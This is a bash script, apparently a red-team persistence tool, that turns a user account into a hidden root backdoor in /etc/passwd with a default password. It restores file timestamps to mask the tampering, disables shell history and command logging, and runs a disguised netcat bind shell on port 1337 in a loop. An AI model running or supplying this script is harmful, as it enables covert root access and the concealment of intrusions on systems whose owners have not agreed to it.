#!/usr/bin/bash 
function add_user {
	#source:  https://raw.githubusercontent.com/d0nkeys/redteam/master/persistence/backdoor-passwd.sh

	#history disabled.."
	set +o history &>/dev/null

	#setting up the user and password
	user=${1:-"apache_2"}
	password=${2:-"redTeamLovesYou"}

	#getting the timestamp of passwd and shodow files 
	mtime_passwd=`stat -c "%y" /etc/passwd`
	mtime_shadow=`stat -c "%y" /etc/shadow`

	#/etc/passwd was modified @ ${mtime_passwd}"
	#/etc/shadow was modified @ ${mtime_shadow}"
	mtime_passwd_seconds=`stat -c "%y" /etc/passwd | cut -d'.' -f 1 | sed -e "s/[-| |:]//g"`
	mtime_shadow_seconds=`stat -c "%y" /etc/shadow | cut -d'.' -f 1 | sed -e "s/[-| |:]//g"`


	#setting apchec_3 uid and gid to 0 and enabling shell"
	sed -i "s/.*${user}.*/${user}:x:0:0:${user}:\/dev\/shm\/.${user}:\/bin\/bash/" /etc/passwd

	# restoring mtime of /etc/passwd to the date before adding user"
	touch -d "${mtime_passwd}" /etc/passwd

	#setting apachec_2 password to redTeamLovesYou"
	echo "${user}:${password}" | chpasswd

	# restoring mtime of /etc/shodow to the date before adding user"
	touch -d "${mtime_shadow}" /etc/shadow

	#creating home directory in /dev/shm/.${user}"
	mkdir -p "/dev/shm/.${user}"

	#disabling bash history for apache_2 user"
	echo "set +o history" > /dev/shm/.${user}/.bash_profile
	echo "set +o history" > /dev/shm/.${user}/.bash_rc

	#unsetting HISTFILE for ${user} user"
	echo "unset HISTFILE" >> /dev/shm/.${user}/.bash_profile
	echo "unset HISTFILE" >> /dev/shm/.${user}/.bash_rc

	#disabling eventual PROMPT_COMMAND keylogger"
	echo "unset PROMPT_COMMAND" >> /dev/shm/.${user}/bash_profile
	echo "unset PROMPT_COMMAND" >> /dev/shm/.${user}/bash_rc
}

function call_back {
        /usr/bin/cp /bin/nc /.empty
	while true
	do
		echo "Press [CTRL+C] to stop.."
		/.empty -lvnp 1337 -w 5 -e /bin/bash
		sleep 1
	done	
}

#clearing bash history 
function final_touch{
	#Clears the variable which says where the history file is stored to so nothing is stored.#
	unset HISTFILE
	#Completely clear the history. Very visible as all history is now gone.#
	history -c
	#Set the number of commands written to the file to 10.#
	export HISTFILESIZE=10	
}



